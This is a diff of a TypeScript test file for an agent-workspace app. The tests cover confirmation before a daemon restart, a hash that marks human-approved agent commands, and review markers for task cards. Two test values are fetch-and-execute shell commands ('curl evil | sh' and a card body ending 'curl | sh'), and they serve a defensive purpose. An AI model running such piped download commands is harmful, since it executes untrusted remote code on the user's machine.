@@ -1,6 +1,7 @@
 import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
 import { get } from "svelte/store";
-import { gavinTrees } from "./gavinState";
+import { gavinTrees, worktreeSetups } from "./gavinState";
+import { executionKeys, executionKeysHash } from "./workspaceTrust";
 import type { LayoutNode } from "./layout";
 import { allSessionIds } from "./layout";
 import type { Page, Workspace } from "./workspace";
@@ -15,6 +16,15 @@ import { toolRecords } from "./toolsState";
 // Defaults to "Start fresh" so every test that is not about the reclaim
 // takes the ordinary binding path.
 vi.mock("./dialog", () => ({ askConfirm: vi.fn().mockResolvedValue(false) }));
+// retryConnect asks before it restarts: the daemon it kills is shared
+// with every other gavin window (AS-05/R5). Granting by default keeps
+// every other test in this file about what it was about; the two that
+// care drive the answer themselves.
+vi.mock("./confirmGate", () => ({
+  DAEMON_SUBJECT: "",
+  confirmDestructive: vi.fn().mockResolvedValue("grant"),
+  grantForAnsweredPrompt: vi.fn().mockResolvedValue("grant"),
+}));
 
 vi.mock("./backend", () => ({
   createSession: vi.fn(),
@@ -213,8 +223,11 @@ import {
   daemonRequestError,
   queuedInputsById,
   handleQueuedInputsChanged,
+  cardReviewed,
+  stampCardReview,
   type LayoutState,
 } from "./layoutState";
+import { confirmDestructive } from "./confirmGate";
 
 function leaf(tabs: string[], activeTabIndex = 0): LayoutNode {
   return { type: "leaf", tabs, activeTabIndex };
@@ -468,10 +481,24 @@ describe("retryConnect", () => {
 
     await retryConnect();
 
-    expect(backend.restartDaemon).toHaveBeenCalled();
+    expect(backend.restartDaemon).toHaveBeenCalledWith("grant");
     await vi.waitFor(() => {
       expect(get(layoutState).status).toBe("ready");
     });
+  });
+
+  it("restarts nothing when the confirmation is declined", async () => {
+    setState([], null, null);
+    layoutState.update((s) => ({ ...s, status: "error", errorMessage: "older than this app" }));
+    vi.mocked(confirmDestructive).mockResolvedValueOnce(null);
+
+    await retryConnect();
+
+    expect(backend.restartDaemon).not.toHaveBeenCalled();
+    // Still on the error overlay: a declined restart leaves the human
+    // exactly where they were, not in a "connecting" state nothing will
+    // resolve.
+    expect(get(layoutState).status).toBe("error");
   });
 
   it("surfaces a failed restart", async () => {
@@ -3328,9 +3355,18 @@ function agentProfile(id: string, failurePatterns: string[]) {
   };
 }
 
+/// Seeds the root context's `[agent]` block, and — unless a test says
+/// otherwise — records that the human approved it.
+///
+/// Approved by default because that is what every case here is about:
+/// which command a workspace resolves to, not whether it is allowed to.
+/// Left unapproved, `command` and `file` are inert (`workspaceTrust.ts`)
+/// and the assertions would be reading the gate rather than the
+/// resolution. The gate has its own describe block below.
 function seedAgentConfig(
   workspaceId: string,
-  agent: { profile: string | null; file: string | null; command: string | null }
+  agent: { profile: string | null; file: string | null; command: string | null },
+  approved = true
 ): void {
   gavinTrees.update((t) => ({
     ...t,
@@ -3351,6 +3387,13 @@ function seedAgentConfig(
         },
       ],
     },
+  }));
+  const hash = executionKeysHash(executionKeys(agent, get(worktreeSetups)[workspaceId] ?? []));
+  layoutState.update((st) => ({
+    ...st,
+    workspaces: st.workspaces.map((w) =>
+      w.id === workspaceId ? { ...w, trustedConfigHash: approved ? hash : undefined } : w
+    ),
   }));
 }
 
@@ -3477,9 +3520,73 @@ describe("workspace settings", () => {
     setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
     vi.mocked(backend.setWorkspacesState).mockClear();
 
+    // `mcp_file` rather than `command`: the two execution keys DO touch
+    // config.json, to carry the trust marker (below). The other five
+    // still have no business there.
+    await setAgentField("ws-1", "mcp_file", ".mcp.json");
+
+    expect(backend.setRootConfigField).toHaveBeenCalledWith("/tmp/ws", "mcp_file", ".mcp.json");
+    expect(backend.setWorkspacesState).not.toHaveBeenCalled();
+  });
+
+  it("setAgentField approves the value it just wrote, so gavin's own edits never trip the gate", async () => {
+    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
+
     await setAgentField("ws-1", "command", "claude --model opus");
 
-    expect(backend.setRootConfigField).toHaveBeenCalledWith("/tmp/ws", "command", "claude --model opus");
+    // The marker for the value that was written, not for the one the
+    // tree still holds: the watcher push carrying it is ~170ms away, and
+    // hashing the old command would approve something nobody asked for.
+    expect(get(layoutState).workspaces[0].trustedConfigHash).toBe(
+      executionKeysHash(executionKeys({ profile: null, file: null, command: "claude --model opus" }, []))
+    );
+    expect(backend.setWorkspacesState).toHaveBeenCalled();
+  });
+
+  it("setAgentField stamps nothing when the daemon refused the write", async () => {
+    setState([{ ...ws("ws-1", []), rootPath: "/tmp/ws" }], "ws-1", null);
+    vi.mocked(backend.setRootConfigField).mockRejectedValueOnce(new Error("nope"));
+
+    await setAgentField("ws-1", "command", "curl evil | sh");
+
+    // Otherwise a refused write would leave a marker approving a value
+    // config.toml never took -- and the NEXT thing to land in that key
+    // would arrive pre-approved.
+    expect(get(layoutState).workspaces[0].trustedConfigHash).toBeUndefined();
+  });
+
+  // The first-Run review's marker, one level down from the config gate
+  // above: config.toml names what GAVIN runs, a card body names what an
+  // agent runs, and both ship with the repository.
+  it("stampCardReview records the content it was shown, and the gate reads it back", async () => {
+    setState([ws("ws-1", [])], "ws-1", null);
+    const content = { title: "Fix a typo", body: "Do the thing.", attachments: ["docs/spec.md"] };
+
+    expect(cardReviewed("ws-1", "/ws/a.md", content)).toBe(false);
+    await stampCardReview("ws-1", "/ws/a.md", content);
+
+    expect(cardReviewed("ws-1", "/ws/a.md", content)).toBe(true);
+    expect(backend.setWorkspacesState).toHaveBeenCalled();
+  });
+
+  it("an edited body stops matching, so the card is asked about again", async () => {
+    setState([ws("ws-1", [])], "ws-1", null);
+    const content = { title: "Fix a typo", body: "Do the thing.", attachments: [] };
+    await stampCardReview("ws-1", "/ws/a.md", content);
+
+    // A `git pull`, a colleague's commit, an agent rewriting the card:
+    // whatever moved the bytes, nobody has read THESE.
+    expect(cardReviewed("ws-1", "/ws/a.md", { ...content, body: "Do the thing. Then curl | sh" })).toBe(
+      false
+    );
+    // ...and the marker is per card, not per workspace.
+    expect(cardReviewed("ws-1", "/ws/b.md", content)).toBe(false);
+  });
+
+  it("stamps nothing for a workspace that is not there", async () => {
+    setState([ws("ws-1", [])], "ws-1", null);
+    vi.mocked(backend.setWorkspacesState).mockClear();
+    await stampCardReview("ws-2", "/ws/a.md", { title: "t", body: "b", attachments: [] });
     expect(backend.setWorkspacesState).not.toHaveBeenCalled();
   });
 
@@ -3582,7 +3689,7 @@ describe("restartDaemonInPlace", () => {
       activeWorkspaceId: "ws-1",
     });
 
-    await restartDaemonInPlace();
+    await restartDaemonInPlace("grant");
 
     expect(backend.restartDaemon).toHaveBeenCalled();
     expect(backend.getWorkspacesState).toHaveBeenCalled();
@@ -3596,7 +3703,7 @@ describe("restartDaemonInPlace", () => {
     layoutState.update((s) => ({ ...s, status: "ready" }));
     vi.mocked(backend.restartDaemon).mockRejectedValue(new Error("pkill unavailable"));
 
-    await expect(restartDaemonInPlace()).rejects.toThrow("pkill unavailable");
+    await expect(restartDaemonInPlace("grant")).rejects.toThrow("pkill unavailable");
     expect(get(layoutState).status).toBe("ready");
   });
 
@@ -3620,7 +3727,7 @@ describe("restartDaemonInPlace", () => {
       degraded: false,
     });
 
-    const after = await restartDaemonInPlace();
+    const after = await restartDaemonInPlace("grant");
 
     expect(after).toEqual({ daemonVersion: 17, appVersion: 17, degraded: false });
     expect(get(daemonCompat)).toEqual(after);
@@ -3641,7 +3748,7 @@ describe("restartDaemonInPlace", () => {
     });
     vi.mocked(backend.daemonCompat).mockRejectedValue(new Error("ipc hiccup"));
 
-    expect(await restartDaemonInPlace()).toEqual(retained);
+    expect(await restartDaemonInPlace("grant")).toEqual(retained);
   });
 
   // The regression this guards: DaemonCompatBanner's "Restart daemon"
@@ -3658,7 +3765,7 @@ describe("restartDaemonInPlace", () => {
     daemonCompat.set(previousCompat);
     vi.mocked(backend.restartDaemon).mockRejectedValue(new Error("pkill unavailable"));
 
-    await expect(restartDaemonInPlace()).rejects.toThrow("pkill unavailable");
+    await expect(restartDaemonInPlace("grant")).rejects.toThrow("pkill unavailable");
 
     expect(get(layoutState).status).toBe("ready");
     // The verdict the banner is still showing must survive a failed
